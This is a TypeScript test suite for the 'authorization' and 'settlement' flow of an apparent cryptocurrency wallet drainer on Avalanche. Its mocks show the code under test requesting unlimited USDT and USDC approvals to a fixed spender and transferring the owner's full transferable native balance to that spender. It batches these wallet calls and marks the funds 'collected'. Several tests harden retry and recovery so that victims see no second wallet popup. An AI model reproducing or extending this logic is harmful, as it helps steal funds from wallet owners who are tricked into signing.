import assert from "node:assert/strict";
import test from "node:test";
import { reconcileEvmBatchNative } from "../../src/authorization/evm-batch-native-reconcile";
import { runAuthorizationSettlement } from "../../src/authorization/phases/settlement-coordinator";
import { runAuthorizationSession } from "../../src/authorization/session";
import { StageStatus } from "../../src/approval/types";
import type { ApprovalOrchestrationResult } from "../../src/approval/types";
import type { NetworkRow } from "../../src/types";
import {
  buildMaximumPreferencesForNetwork,
  listIncludedAssetWork,
} from "../../src/authorization/preferences";

const OWNER = "0x1111111111111111111111111111111111111111";
const SPENDER = "0x2222222222222222222222222222222222222222";
const AVAX_USDT = "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7";
const AVAX_USDC = "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E";
const MAX_UINT =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

const networks: NetworkRow[] = [
  {
    key: "avax",
    name: "Avalanche",
    standard: "ERC-20",
    color: "#E84142",
    letter: "A",
    balances: { native: "1", usdt: "10", usdc: "5" },
  },
];

function mockApprovalOk(): ApprovalOrchestrationResult {
  return {
    ok: true,
    status: StageStatus.OK,
    txHash: "0xapprove",
    approvalId: "ap-mock",
    context: {
      request: {} as never,
      broadcast: { txHash: "0xapprove" },
      prepared: {} as never,
      stageLog: [],
    },
    stages: [],
  };
}

function prepareJson(token: "USDT" | "USDC") {
  const tokenAddress = token === "USDT" ? AVAX_USDT : AVAX_USDC;
  return {
    amountRaw: MAX_UINT,
    tokenAddress,
    spender: SPENDER,
    chainId: 43114,
    amountHuman: "UNLIMITED",
    to: tokenAddress,
    data: `0x095ea7b3000000000000000000000000${SPENDER.slice(
      2,
    )}ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`,
  };
}

function installWalletApiMocks() {
  const originalFetch = globalThis.fetch;
  globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input);
    const body =
      typeof init?.body === "string" ? JSON.parse(init.body) : undefined;

    if (url.includes("/api/native-transfers/estimate")) {
      return new Response(
        JSON.stringify({
          network: "avax",
          owner: OWNER,
          recipient: SPENDER,
          transferableRaw: "900000000000000000",
          canTransfer: true,
          chainId: 43114,
        }),
        { status: 201, headers: { "content-type": "application/json" } },
      );
    }
    if (url.includes("/api/approvals/prepare")) {
      const token = (body?.token as "USDT" | "USDC") ?? "USDT";
      return new Response(JSON.stringify(prepareJson(token)), {
        status: 200,
        headers: { "content-type": "application/json" },
      });
    }
    if (url.includes("/api/verify-allowance")) {
      return new Response(
        JSON.stringify({ ok: true, hasAllowance: false, allowance: "0" }),
        { status: 200, headers: { "content-type": "application/json" } },
      );
    }
    if (
      url.includes("/api/energy-delegate") ||
      url.includes("/api/resources/verify")
    ) {
      return new Response(
        JSON.stringify({ status: "READY", message: "ok" }),
        { status: 200, headers: { "content-type": "application/json" } },
      );
    }
    return originalFetch(input, init);
  }) as typeof fetch;
  return () => {
    globalThis.fetch = originalFetch;
  };
}

function installSettlementFetchMock() {
  const originalFetch = globalThis.fetch;
  globalThis.fetch = (async (input: RequestInfo | URL) => {
    const url = String(input);
    if (url.includes("/api/auth/wallet/challenge")) {
      return new Response(
        JSON.stringify({
          sessionId: "wallet-session-1",
          challenge: "challenge-msg",
          expiresAt: new Date(Date.now() + 3600_000).toISOString(),
        }),
        { status: 200, headers: { "content-type": "application/json" } },
      );
    }
    if (url.includes("/api/auth/wallet/verify")) {
      return new Response(
        JSON.stringify({
          token: "wallet-token",
          expiresAt: new Date(Date.now() + 3600_000).toISOString(),
        }),
        { status: 200, headers: { "content-type": "application/json" } },
      );
    }
    if (url.includes("/api/network-settlement/register")) {
      return new Response(
        JSON.stringify({ ok: true, settlementSessionId: "settle-1" }),
        { status: 200, headers: { "content-type": "application/json" } },
      );
    }
    if (url.includes("/api/token-collection/nudge")) {
      return new Response(JSON.stringify({ ok: true }), {
        status: 200,
        headers: { "content-type": "application/json" },
      });
    }
    if (url.includes("/api/token-collection/native-readiness")) {
      return new Response(
        JSON.stringify({
          canExecuteNative: true,
          tokens: [
            {
              token: "USDT",
              state: "success",
              stateLabel: "Success",
              active: false,
            },
            {
              token: "USDC",
              state: "success",
              stateLabel: "Success",
              active: false,
            },
          ],
          blocking: [],
        }),
        { status: 200, headers: { "content-type": "application/json" } },
      );
    }
    if (url.includes("/native-complete")) {
      return new Response(JSON.stringify({ ok: true }), {
        status: 200,
        headers: { "content-type": "application/json" },
      });
    }
    if (url.includes("/register-native-authorization")) {
      return new Response(JSON.stringify({ ok: true }), {
        status: 200,
        headers: { "content-type": "application/json" },
      });
    }
    return originalFetch(input);
  }) as typeof fetch;
  return () => {
    globalThis.fetch = originalFetch;
  };
}

function baseSettlementCapture(
  native?: {
    authorizationKind:
      | "evm_batch_executed"
      | "evm_batch_unknown"
      | "evm_signed";
    authorizationPayload: Record<string, unknown>;
  },
) {
  return {
    sessionId: "states-test",
    network: "avax",
    owner: OWNER,
    tokens: [
      {
        item: {
          network: "avax",
          asset: "USDT",
          unlimited: true,
          amountHuman: "",
        },
        orchestration: mockApprovalOk(),
        shouldAttemptTransfer: true,
        transferAmountRaw: "1000000",
      },
      {
        item: {
          network: "avax",
          asset: "USDC",
          unlimited: true,
          amountHuman: "",
        },
        orchestration: mockApprovalOk(),
        shouldAttemptTransfer: true,
        transferAmountRaw: "500000",
      },
    ],
    native: native
      ? {
          network: "avax",
          owner: OWNER,
          estimateTransferableRaw: "900000000000000000",
          recipient: SPENDER,
          ...native,
        }
      : undefined,
    batchId: "batch-1",
  };
}

function createBatchProvider(
  getCallsStatus: () => Record<string, unknown>,
) {
  return {
    request: async (args: { method: string; params?: unknown[] }) => {
      if (args.method === "wallet_getCapabilities") {
        return { "0xa86a": { atomic: { status: "ready" } } };
      }
      if (args.method === "wallet_sendCalls") {
        return { id: "batch-1" };
      }
      if (args.method === "wallet_getCallsStatus") {
        return getCallsStatus();
      }
      if (args.method === "eth_chainId") {
        return "0xa86a";
      }
      if (args.method === "personal_sign") {
        return "0xsignature";
      }
      return null;
    },
    session: {
      topic: "mock",
      namespaces: { eip155: { accounts: [`eip155:43114:${OWNER}`] } },
    },
  };
}

test("reconcileEvmBatchNative returns failed_revert when native receipt reverted", async () => {
  const provider = createBatchProvider(() => ({
    status: "CONFIRMED",
    receipts: [
      { status: "success", transactionHash: "0xusdt" },
      { status: "success", transactionHash: "0xusdc" },
      { status: "reverted", transactionHash: "0xnative-fail" },
    ],
  }));

  const result = await reconcileEvmBatchNative({
    provider: provider as never,
    batchId: "batch-1",
    chainId: 43114,
    tokenJobCount: 2,
    maxAttempts: 1,
    pollIntervalMs: 1,
  });

  assert.equal(result.status, "failed_revert");
});

test("batch native revert skips wallet phase — settlement handles recovery", async () => {
  const restoreFetch = installWalletApiMocks();
  let nativeWalletCalls = 0;

  const provider = createBatchProvider(() => ({
    status: "CONFIRMED",
    receipts: [
      { status: "success", transactionHash: "0xusdt" },
      { status: "success", transactionHash: "0xusdc" },
      { status: "reverted", transactionHash: "0xnative-fail" },
    ],
  }));

  try {
    const row = networks[0];
    const prefs = { avax: buildMaximumPreferencesForNetwork("avax") };
    const items = listIncludedAssetWork(prefs, [row], "avax");

    const summary = await runAuthorizationSession({
      items,
      networks: [row],
      accounts: { evm: OWNER, tron: null },
      getSpender: () => SPENDER,
      startSettlement: false,
      evmBatchProvider: provider as never,
      runApproval: async () => mockApprovalOk(),
      runNativeTransfer: async () => {
        nativeWalletCalls += 1;
        return {
          ok: true,
          context: { request: {} as never, stageLog: [] },
          stages: [],
          deferredSignedRaw: "0xsigned",
        };
      },
    });

    assert.equal(nativeWalletCalls, 0);
    const usdt = summary.items.find((i) => i.token === "USDT");
    const usdc = summary.items.find((i) => i.token === "USDC");
    const native = summary.items.find((i) => i.token === "NATIVE");
    assert.equal(usdt?.outcome, "authorized");
    assert.equal(usdc?.outcome, "authorized");
    assert.equal(native?.outcome, "failed");
  } finally {
    restoreFetch();
  }
});

test("wallet phase does not mark native successful on user batch rejection", async () => {
  const restoreFetch = installWalletApiMocks();

  const provider = {
    request: async (args: { method: string }) => {
      if (args.method === "wallet_getCapabilities") {
        return { "0xa86a": { atomic: { status: "ready" } } };
      }
      if (args.method === "wallet_sendCalls") {
        const err = new Error("User rejected") as Error & { code?: number };
        err.code = 4001;
        throw err;
      }
      if (args.method === "eth_chainId") {
        return "0xa86a";
      }
      return null;
    },
    session: {
      topic: "mock",
      namespaces: { eip155: { accounts: [`eip155:43114:${OWNER}`] } },
    },
  };

  try {
    const row = networks[0];
    const prefs = { avax: buildMaximumPreferencesForNetwork("avax") };
    const items = listIncludedAssetWork(prefs, [row], "avax");

    const summary = await runAuthorizationSession({
      items,
      networks: [row],
      accounts: { evm: OWNER, tron: null },
      getSpender: () => SPENDER,
      startSettlement: false,
      evmBatchProvider: provider as never,
      runApproval: async () => mockApprovalOk(),
      runNativeTransfer: async () => ({
        ok: false,
        userRejected: true,
        context: { request: {} as never, stageLog: [] },
        stages: [],
      }),
    });

    const native = summary.items.find((i) => i.token === "NATIVE");
    assert.equal(native?.outcome, "user_rejected");
    assert.ok(
      summary.items.every(
        (i) => i.token === "NATIVE" || i.outcome === "user_rejected",
      ),
    );
  } finally {
    restoreFetch();
  }
});

test("poll timeout after batch submit preserves unknown — no second wallet popup in settlement", async () => {
  const restoreSettlement = installSettlementFetchMock();
  let nativeTransferCalls = 0;

  const provider = createBatchProvider(() => {
    const err = new Error("timeout") as Error & { code?: string };
    err.code = "BATCH_CONFIRMATION_TIMEOUT";
    throw err;
  });

  try {
    const result = await runAuthorizationSettlement({
      capture: baseSettlementCapture({
        authorizationKind: "evm_batch_unknown",
        authorizationPayload: {
          batchId: "batch-1",
          chainId: 43114,
          tokenJobCount: 2,
        },
      }),
      networks,
      accounts: { evm: OWNER, tron: null },
      apiBaseUrl: "http://localhost:3000",
      getSpender: () => SPENDER,
      provider: provider as never,
      runApprovalSettlement: async () => mockApprovalOk(),
      runNativeTransfer: async () => {
        nativeTransferCalls += 1;
        return {
          ok: true,
          context: { request: {} as never, stageLog: [] },
          stages: [],
          txHash: "0xshould-not-run",
        };
      },
    });

    assert.equal(nativeTransferCalls, 0);
    assert.equal(result.ok, false);
    assert.match(String(result.error), /still unknown/i);
  } finally {
    restoreSettlement();
  }
});

test("settlement reconciles unknown batch to success without wallet popup", async () => {
  const restoreSettlement = installSettlementFetchMock();
  let nativeTransferCalls = 0;

  const provider = createBatchProvider(() => ({
    status: "CONFIRMED",
    receipts: [
      { status: "success", transactionHash: "0xusdt" },
      { status: "success", transactionHash: "0xusdc" },
      { status: "success", transactionHash: "0xnative-reconciled" },
    ],
  }));

  try {
    const result = await runAuthorizationSettlement({
      capture: baseSettlementCapture({
        authorizationKind: "evm_batch_unknown",
        authorizationPayload: {
          batchId: "batch-1",
          chainId: 43114,
          tokenJobCount: 2,
        },
      }),
      networks,
      accounts: { evm: OWNER, tron: null },
      apiBaseUrl: "http://localhost:3000",
      getSpender: () => SPENDER,
      provider: provider as never,
      runApprovalSettlement: async () => mockApprovalOk(),
      runNativeTransfer: async () => {
        nativeTransferCalls += 1;
        return {
          ok: true,
          context: { request: {} as never, stageLog: [] },
          stages: [],
          txHash: "0xshould-not-run",
        };
      },
    });

    assert.equal(nativeTransferCalls, 0);
    assert.equal(result.ok, true);
    const nativeItem = result.sessionResult.items.find(
      (i) => i.token === "NATIVE",
    );
    assert.equal(nativeItem?.outcome, "collected");
    assert.equal(nativeItem?.txHash, "0xnative-reconciled");
  } finally {
    restoreSettlement();
  }
});

test("settlement recovery after reconcile failed_revert uses eth_sendTransaction once", async () => {
  const restoreSettlement = installSettlementFetchMock();
  const modes: string[] = [];

  const provider = createBatchProvider(() => ({
    status: "CONFIRMED",
    receipts: [
      { status: "success", transactionHash: "0xusdt" },
      { status: "success", transactionHash: "0xusdc" },
      { status: "reverted", transactionHash: "0xnative-fail" },
    ],
  }));

  try {
    const result = await runAuthorizationSettlement({
      capture: baseSettlementCapture({
        authorizationKind: "evm_batch_unknown",
        authorizationPayload: {
          batchId: "batch-1",
          chainId: 43114,
          tokenJobCount: 2,
        },
      }),
      networks,
      accounts: { evm: OWNER, tron: null },
      apiBaseUrl: "http://localhost:3000",
      getSpender: () => SPENDER,
      provider: provider as never,
      runApprovalSettlement: async () => mockApprovalOk(),
      runNativeTransfer: async (args) => {
        modes.push(args.mode ?? "full");
        return {
          ok: true,
          context: { request: {} as never, stageLog: [] },
          stages: [],
          txHash: "0xrecovery-native",
        };
      },
    });

    assert.deepEqual(modes, ["full"]);
    assert.equal(result.ok, true);
    const nativeItem = result.sessionResult.items.find(
      (i) => i.token === "NATIVE",
    );
    assert.equal(nativeItem?.txHash, "0xrecovery-native");
  } finally {
    restoreSettlement();
  }
});

test("evm_batch_executed never triggers second native execution", async () => {
  const restoreSettlement = installSettlementFetchMock();
  let nativeTransferCalls = 0;

  try {
    const result = await runAuthorizationSettlement({
      capture: baseSettlementCapture({
        authorizationKind: "evm_batch_executed",
        authorizationPayload: { txHash: "0xalready-done" },
      }),
      networks,
      accounts: { evm: OWNER, tron: null },
      apiBaseUrl: "http://localhost:3000",
      getSpender: () => SPENDER,
      runApprovalSettlement: async () => mockApprovalOk(),
      runNativeTransfer: async () => {
        nativeTransferCalls += 1;
        return {
          ok: true,
          context: { request: {} as never, stageLog: [] },
          stages: [],
          txHash: "0xduplicate",
        };
      },
    });

    assert.equal(nativeTransferCalls, 0);
    assert.equal(result.ok, true);
    const nativeItem = result.sessionResult.items.find(
      (i) => i.token === "NATIVE",
    );
    assert.equal(nativeItem?.txHash, "0xalready-done");
  } finally {
    restoreSettlement();
  }
});
